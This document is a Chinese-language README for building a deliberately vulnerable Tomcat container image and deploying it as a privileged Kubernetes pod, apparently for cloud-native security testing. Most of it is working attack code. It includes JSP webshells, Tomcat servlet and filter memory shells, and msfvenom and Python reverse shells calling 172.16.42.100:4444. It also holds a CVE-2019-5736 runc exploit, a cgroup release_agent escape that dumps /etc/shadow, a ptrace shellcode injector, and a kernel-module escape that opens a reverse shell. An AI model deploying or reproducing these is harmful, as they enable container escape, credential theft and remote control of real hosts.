# Cloud-Native-Security-Test
容器云测试镜像制作，[文章链接](https://shadowfl0w.github.io/%E5%AE%B9%E5%99%A8%E5%9C%BA%E6%99%AF%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%95%9C%E5%83%8F%E5%88%B6%E4%BD%9C%E5%8F%8A%E9%83%A8%E7%BD%B2/)



## 镜像准备



下载构建环境（我已经打包到github）

```
mkdir -p /root/docker/
cd /root/docker
git clone https://github.com/ShadowFl0w/Cloud-Native-Security-Test.git
```

准备其他工具

```shell
cd /root/docker/Cloud-Native-Security-Test


#下载Tomcat
wget https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.31/bin/apache-tomcat-8.5.31.tar.gz

#下载jdk-8u251-linux-x64.tar.gz(已下载好)

#msf木马
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.0.4 LPORT=4444 -f elf > msfshell.elf

#java agent内存马
wget https://github.com/keven1z/weblogic_memshell/releases/download/1.2/inject.jar
wget https://github.com/keven1z/weblogic_memshell/releases/download/1.2/shell-agent.jar

#添加java-sec-code项目
git clone https://github.com/JoyChou93/java-sec-code
在application.properties文件中添加`server.port = 8090`配置，因为默认端口是8080会和容器本身的tomcat端口冲突，所有这里需要改一下。
mvn clean package -DskipTests
jar复制到/root/docker/Cloud-Native-Security-Test

#id_rsa.pub
ssh-keygen -t rsa
cp ~/.ssh/id_rsa.pub ./


#安装CDK
wget https://github.com/cdk-team/CDK/releases/download/v1.0.6/cdk_linux_amd64

#安装fscan
wget https://github.com/shadow1ng/fscan/releases/download/1.6.3/fscan_amd64

#修改x.py ip和端口

#编译a.c
gcc a.c -o a

#修改5736ip和端口，并且编译
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build 5736.go


#sys_ptrace,修改infec.c
生成shellcode(如果不生成，会在靶机上生成一个终端)，这里我们需要提前知道反弹shell测试机器的地址和端口
msfvenom -p linux/x64/shell_reverse_tcp LHOST=30.138.0.5 LPORT=33033 -f c
编译
gcc infect.c -o infect

#SYS_MODULE，修改exp.c
make编译

```



可疑脚本docker-entrypoint.sh，给docker-entrypoint.sh添加执行权限

```
chmod +x docker-entrypoint.sh
```

使用Dockerfile构建镜像

```
docker build -t mytomcat:v6.0.1 .
```

运行测试

```
docker run --rm -it --name mytomcat -p 8081:8080 mytomcat:v6.0.1
```

添加ssh登录



**ssh登录**

需要配置/etc/ssh/sshd_config文件里的配置信息， vim /etc/ssh/sshd_config进行编辑，按“i”进入编辑状态，在其文件里找到并修改为：PasswordAuthentication yes,PermitRootLogin yes两行即可。

commit

```
docker commit mytomcat mytomcat:v6.0.2
```







**修改tomcat配置**

#/usr/local/tomcat/conf/tomcat-users.xml,账号内容改为如下

```xml
<?xml version="1.0" encoding="UTF-8"?>

<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<role rolename="admin-gui"/>
<role rolename="manager-gui"/>
<role rolename="manager-jmx"/>
<role rolename="manager-script"/>
<role rolename="manager-status"/>
<user username="admin" password="admin" roles="admin-gui,manager-gui,manager-jmx, manager-script,manager-status"/>
</tomcat-users>

```



## 马测试

#### 添加jsp马

最基础的jsp马如下，放到`/usr/local/tomcat/webapps/ROOT`目录下

- jspshell0.jsp

  ```jsp
  <%@ page contentType="text/html;charset=UTF-8" language="java" %>
  <html>
  <body>
  <%
      Runtime runtime = Runtime.getRuntime();
      String cmd = request.getParameter("cmd");
      Process process = runtime.exec(cmd);
      java.io.InputStream in = process.getInputStream();
      out.print("<pre>");
      java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
      java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
      String s = null;
      while ((s = stdInput.readLine()) != null) {
          out.println(s);
      }
      out.print("</pre>");
  %>
  </body>
  </html>
  ```

   `http://172.16.42.10:8081/jspshell0.jsp?pwd=password&cmd=whoami`

  

反射jsp马如下，放到`/usr/local/tomcat/webapps/ROOT`目录下

- ClassforName.jsp

```java
<%@ page language="java" pageEncoding="UTF-8" %>
<%
    // 加入一个密码
    String PASSWORD = "password";
    String passwd = request.getParameter("pwd");
    String cmd = request.getParameter("cmd");
    if (!passwd.equals(PASSWORD)) {
        return;
    }
    // 反射调用
    Class rt = Class.forName("java.lang.Runtime");
    java.lang.reflect.Method gr = rt.getMethod("getRuntime");
    java.lang.reflect.Method ex = rt.getMethod("exec", String.class);
    Process process = (Process) ex.invoke(gr.invoke(null), cmd);
    java.io.InputStream in = process.getInputStream();
    out.print("<pre>");
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = null;
    while ((s = stdInput.readLine()) != null) {
        out.println(s);
    }
    out.print("</pre>");
%>
```

访问`http://172.16.42.10:8081/ClassforName.jsp?pwd=password&cmd=whoami`即可 





#### tomcat 内存马

放到`/usr/local/tomcat/webapps/ROOT`

- servletmem.jsp

```jsp
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    Servlet servlet = new Servlet() {
        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            String cmd = servletRequest.getParameter("cmd");
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"bash", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            PrintWriter out = servletResponse.getWriter();
            out.println(output);
            out.flush();
            out.close();
        }
        @Override
        public void init(ServletConfig servletConfig) throws ServletException {

        }

        @Override
        public ServletConfig getServletConfig() {
            return null;
        }

        @Override
        public String getServletInfo() {
            return null;
        }

        @Override
        public void destroy() {

        }
    };
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    Wrapper newWrapper = standardContext.createWrapper();
    String servletName="ff";
    newWrapper.setName(servletName);
    newWrapper.setLoadOnStartup(1);
    newWrapper.setServlet(servlet);
    newWrapper.setServletClass(servlet.getClass().getName());
    standardContext.addChild(newWrapper);
    //将Wrapper对象和访问的url绑定
    standardContext.addServletMapping("/servletevil", servletName);
%>
```

利用方式：

访问：

- `http://172.16.42.10:8081/servletevil.jsp`

- `http://172.16.42.10:8081/servletevil?cmd=whoami` 



filter内存马

- filtermem.jsp

```jsp
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<%
     final String name = "shadowtest";
     ServletContext servletContext = request.getSession().getServletContext();

     Field appctx = servletContext.getClass().getDeclaredField("context");
     appctx.setAccessible(true);
     ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

     Field stdctx = applicationContext.getClass().getDeclaredField("context");
     stdctx.setAccessible(true);
     StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

     Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
     Configs.setAccessible(true);
     Map filterConfigs = (Map) Configs.get(standardContext);

     if (filterConfigs.get(name) == null){
          Filter filter = new Filter() {
               @Override
               public void init(FilterConfig filterConfig) throws ServletException {

               }

               @Override
               public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                    HttpServletRequest req = (HttpServletRequest) servletRequest;
                    if (req.getParameter("cmd") != null){
                         byte[] bytes = new byte[1024];
                         Process process = new ProcessBuilder("bash","-c",req.getParameter("cmd")).start();
                         int len = process.getInputStream().read(bytes);
                         servletResponse.getWriter().write(new String(bytes,0,len));
                         process.destroy();
                         return;
                    }
                    filterChain.doFilter(servletRequest,servletResponse);
               }

               @Override
               public void destroy() {

               }

          };


          FilterDef filterDef = new FilterDef();
          filterDef.setFilter(filter);
          filterDef.setFilterName(name);
          filterDef.setFilterClass(filter.getClass().getName());
          /**
           * 将filterDef添加到filterDefs中
           */
          standardContext.addFilterDef(filterDef);

          FilterMap filterMap = new FilterMap();
          filterMap.addURLPattern("/*");
          filterMap.setFilterName(name);
          filterMap.setDispatcher(DispatcherType.REQUEST.name());

          standardContext.addFilterMapBefore(filterMap);

          Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
          constructor.setAccessible(true);
          ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

          filterConfigs.put(name,filterConfig);
          out.print("Inject Success !");
     }
%>
```

先访问：`http://172.16.42.10:8081/filtermem.jsp`

再：`http://172.16.42.10:8081/?cmd=id`



- filterClassforName.jsp

```jsp
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<%
    final String name = "shadowtest";
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    if (filterConfigs.get(name) == null){
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {

            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                HttpServletRequest req = (HttpServletRequest) servletRequest;
                if (req.getParameter("cmd") != null){
                    String cmd = request.getParameter("cmd");
                    Class rt = null;
                    try {
                        rt = Class.forName("java.lang.Runtime");
                    } catch (ClassNotFoundException e) {
                        e.printStackTrace();
                    }
                    java.lang.reflect.Method gr = null;
                    try {
                        gr = rt.getMethod("getRuntime");
                    } catch (NoSuchMethodException e) {
                        e.printStackTrace();
                    }
                    java.lang.reflect.Method ex = null;
                    try {
                        ex = rt.getMethod("exec", String.class);
                    } catch (NoSuchMethodException e) {
                        e.printStackTrace();
                    }
                    Process process = null;
                    try {
                        process = (Process) ex.invoke(gr.invoke(null), cmd);
                    } catch (IllegalAccessException e) {
                        e.printStackTrace();
                    } catch (InvocationTargetException e) {
                        e.printStackTrace();
                    }
                    java.io.InputStream in = process.getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\a");
                    String output = s.hasNext() ? s.next() : "";
                    PrintWriter out = servletResponse.getWriter();
                    out.println(output);
                    out.flush();
                    out.close();
                    return;
                }
                filterChain.doFilter(servletRequest,servletResponse);
            }

            @Override
            public void destroy() {

            }

        };


        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        /**
         * 将filterDef添加到filterDefs中
         */
        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        standardContext.addFilterMapBefore(filterMap);

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

        filterConfigs.put(name,filterConfig);
        out.print("Inject Success !");
    }
%>
```

访问 `http://172.16.42.10:8081/filterClassForName.jsp`

再`http://172.16.42.10:8081/?cmdx=whoami`



#### 添加agent java 内存马

进入容器，由于注入成功会自动删除jar包，我们对其进行备份

```
cp inject.jar inject.jar.bak
cp shell-agent.jar shell-agent.jar.bak
```

注入

```
root@edcb337d401a:~# java -jar inject.jar shadowtest
[+] Load Agent Path:/root/shell-agent.jar
[+] OK.i find a jvm:org.apache.catalina.startup.Bootstrap start
[+] memeShell is injected.
```

访问`http://172.16.42.10:8081/?psw=shadowtest&cmd=whoami` 











##  逃逸相关工具脚本

参考：[容器逃逸](https://shadowfl0w.github.io/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/)

procfs逃逸

- x.py

```python
#!/bin/python
import os
import pty
import socket
lhost = "172.16.42.100"
lport = 4444
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    os.putenv("HISTFILE", '/dv/null')
    pty.spawn("/bin/bash")
    os.remove('/tmp/.x.py')
    s.close()
if __name__ == "__main__":
    main()
```

- a.c

```c
#include <stdio.h>

int main(void)
{
    int *a = NULL;
    *a = 1;
    return 0;
}
```

```
gcc a.c -o a
```



#### CVE-2019-5736 runc容器逃逸漏洞

- 5736.go

```go
package main

// Implementation of CVE-2019-5736
// Created with help from @singe, @_cablethief, and @feexd.
// This commit also helped a ton to understand the vuln
// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
import (
	"fmt"
	"io/ioutil"
	"os"
	"strconv"
	"strings"
)

// This is the line of shell commands that will execute on the host
//var payload = "#!/bin/bash \n cat /etc/shadow > /tmp/shadow && chmod 777 /tmp/shadow"
var payload = "#!/bin/bash \n bash -i >& /dev/tcp/172.16.42.100/4444 0>&1"

func main() {
	// First we overwrite /bin/sh with the /proc/self/exe interpreter path
	fd, err := os.Create("/bin/sh")
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Fprintln(fd, "#!/proc/self/exe")
	err = fd.Close()
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("[+] Overwritten /bin/sh successfully")

	// Loop through all processes to find one whose cmdline includes runcinit
	// This will be the process created by runc
	var found int
	for found == 0 {
		pids, err := ioutil.ReadDir("/proc")
		if err != nil {
			fmt.Println(err)
			return
		}
		for _, f := range pids {
			fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
			fstring := string(fbytes)
			if strings.Contains(fstring, "runc") {
				fmt.Println("[+] Found the PID:", f.Name())
				found, err = strconv.Atoi(f.Name())
				if err != nil {
					fmt.Println(err)
					return
				}
			}
		}
	}

	// We will use the pid to get a file handle for runc on the host.
	var handleFd = -1
	for handleFd == -1 {
		// Note, you do not need to use the O_PATH flag for the exploit to work.
		handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
		if int(handle.Fd()) > 0 {
			handleFd = int(handle.Fd())
		}
	}
	fmt.Println("[+] Successfully got the file handle")

	// Now that we have the file handle, lets write to the runc binary and overwrite it
	// It will maintain it's executable flag
	for {
		writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
		if int(writeHandle.Fd()) > 0 {
			fmt.Println("[+] Successfully got write handle", writeHandle)
			writeHandle.Write([]byte(payload))
			return
		}
	}
}
```

```
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build 5736.go
```



#### CVE-2019-14271:加载不受信任的动态链接

这个漏洞的脚本暂时不使用，需要宿主机的权限操作。



#### SYS_ADMIN逃逸

- release_agent.sh

```sh
#!/bin/bash

set -uex

mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

sleep 2
cat "/output"
```





#### SYS_PTRACE逃逸

生成shellcode(如果不生成，会在靶机上生成一个终端)，<font color="red">这里我们需要提前知道反弹shell测试机器的地址和端口</font>

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.16.42.100 LPORT=4444 -f c
```

替换shellcode(<font color="red">注意长度#define SHELLCODE_SIZE 74，等于shellcode的大小，一定要设置为相应大小的值</font>）:

- infect.c

```c
/*
  Mem Inject
  Copyright (c) 2016 picoFlamingo
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>

#define SHELLCODE_SIZE 74

unsigned char *shellcode = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x11\x5c\xac\x10\x2a\x64\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"; 


int
inject_data (pid_t pid, unsigned char *src, void *dst, int len)
{
  int      i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

  for (i = 0; i < len; i+=4, s++, d++)
    {
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
	{
	  perror ("ptrace(POKETEXT):");
	  return -1;
	}
    }
  return 0;
}

int
main (int argc, char *argv[])
{
  pid_t                   target;
  struct user_regs_struct regs;
  int                     syscall;
  long                    dst;

  if (argc != 2)
    {
      fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
      exit (1);
    }
  target = atoi (argv[1]);
  printf ("+ Tracing process %d\n", target);

  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
    {
      perror ("ptrace(ATTACH):");
      exit (1);
    }

  printf ("+ Waiting for process...\n");
  wait (NULL);

  printf ("+ Getting Registers\n");
  if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  

  /* Inject code into current RPI position */

  printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
  inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);

  regs.rip += 2;
  printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);

  if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  printf ("+ Run it!\n");

 
  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
	{
	  perror ("ptrace(DETACH):");
	  exit (1);
	}
  return 0;

}
```

编译代码:

```
gcc infect.c -o infect
```



#### SYS_MODULE逃逸

将下面两个文件放在moduleEXP文件夹，编译后移动到容器， 这里也需要提前知道反弹地址

- exp.c (<font color=red>名字必须是exp.c</font>)

```c
#include <linux/module.h> /* Needed by all modules */
#include <linux/kernel.h> /* Needed for KERN_INFO */
#include <linux/init.h> /* Needed for the macros */
#include <linux/sched/signal.h>
#include <linux/nsproxy.h>
#include <linux/proc_ns.h>
///< The license type -- this affects runtime behavior
MODULE_LICENSE("GPL");
///< The author -- visible when you use modinfo
MODULE_AUTHOR("Nimrod Stoler");
///< The description -- see modinfo
MODULE_DESCRIPTION("NS Escape LKM");
///< The version of the module
MODULE_VERSION("0.1");
static int __init escape_start(void)
{
    int rc;
    static char *envp[] = {
        "SHELL=/bin/bash",
        "HOME=/home/cyberark",
        "USER=cyberark",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin",
        "DISPLAY=:0",
        NULL
    };
    char *argv[] = {"/bin/bash","-c", "bash -i >& /dev/tcp/172.16.42.100/4444 0>&1", NULL};
    rc = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    printk("RC is: %i \n", rc);
    return 0;
}


static void __exit escape_end(void)
{
    printk(KERN_EMERG "Goodbye!\n");
}
module_init(escape_start);
module_exit(escape_end);
```

- Makefile

  <font color="red">这里是tab，不能用空格替代tab</font>

```makefile
ifneq ($(KERNELRELEASE),)
    obj-m :=exp.o
else
    KDIR :=/lib/modules/$(shell uname -r)/build
all:
	make -C $(KDIR) M=$(PWD) modules
clean:
	rm -f *.ko *.o *.mod.o *.mod.c *.symvers *.order
endif
```



## 镜像上传

### 镜像导出导入

将我们的镜像导出

```
导出镜像
docker save -o mytomcat.tar mytomcat:v1.0
```

将保存的镜像导入到要上传的服务器

```
导入镜像
docker load -i mytomcat.tar
```

执行docker images就可以看见镜像导入了



### 镜像仓库认证

登录仓库，如果是私有镜像需要添加如下的配置，防止`x509: certificate signed by unknown authority`错误

```
#vi /etc/docker/daemon.json

{  
   "insecure-registries":[""]
}
```

修改后重启docker，然后使用如下命令登录Registry

```
docker login --username=xxx hub.xxx.com
```



### 推送镜像

push镜像

```
docker tag mytomcat:v1.0 hub.xxx.com/user/sectest:v1.0

docker push hub.xxx.com/user/sectest:v1
```





## 3. 集群运行

### 挂载危险目录以及开启特权

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: xxx
#k8s是放在metada下面，测试的集群需要是单独一行
#  labels:
#    caas_service: xxx
labels:
  caas_service: xxx
spec:
  selector:
    matchLabels:
      run: xxx
  template:
    metadata:
      labels:
        run: xxx
        caas_service: xxx
    spec:
      containers:
        - name: xxx
          image: hub.xxx.com/user/xxx:v1
          imagePullPolicy: IfNotPresent
          securityContext:
            privileged: true
          args: ["/bin/bash", "-c", "/root/shell.sh"]
          volumeMounts:
            - name: rootfs
              mountPath: /host/rootfs
            - name: dockersock
              mountPath: /var/run/docker.sock
            - name: dockerbin
              mountPath: /usr/bin/docker
            - name: proc
              mountPath: /host/proc
      volumes:
        - name: rootfs
          hostPath:
            path: /
        - name: dockersock
          hostPath: 
          	path: /var/run/docker.sock
        - name: dockerbin
          hostPath:
            path: /usr/bin/docker
        - name: proc
          hostPath:
            path: /proc
```



### 开启各种Capabilities

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: xxx
#k8s是放在metada下面，测试的集群需要是单独一行
#  labels:
#    caas_service: xxx
labels:
  caas_service: xxx
spec:
  selector:
    matchLabels:
      run: xxx
  template:
    metadata:
      labels:
        run: xxx
        caas_service: xxx
    spec:
      containers:
        - name: xxx
          image: hub.xxx.com/user/xxx:v1
          imagePullPolicy: IfNotPresent
          securityContext:
            privileged: true
            capabilities:
              add:
              - SYS_ADMIN
              - SYS_PTRACE
              - SYS_MODULE
          volumeMounts:
            - name: rootfs
              mountPath: /host/rootfs
            - name: dockersock
              mountPath: /var/run/docker.sock
            - name: dockerbin
              mountPath: /usr/bin/docker
            - name: proc
              mountPath: /host/proc
      volumes:
        - name: rootfs
          hostPath:
            path: /
        - name: dockersock
          hostPath: 
          	path: /var/run/docker.sock
        - name: dockerbin
          hostPath:
            path: /usr/bin/docker
        - name: proc
          hostPath:
            path: /proc
```

